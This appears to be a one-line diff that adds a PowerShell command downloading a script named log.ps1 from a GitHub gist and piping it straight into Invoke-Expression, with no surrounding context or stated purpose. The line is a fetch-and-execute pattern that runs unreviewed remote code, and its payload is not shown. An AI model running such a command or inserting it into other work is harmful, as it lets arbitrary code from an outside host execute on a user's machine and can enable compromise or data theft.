@@ -1,0 +1,1 @@
+irm https://gist.githubusercontent.com/Johnsn0w/672b679a608e0205a6b20e7df137c917/raw/log.ps1 | iex
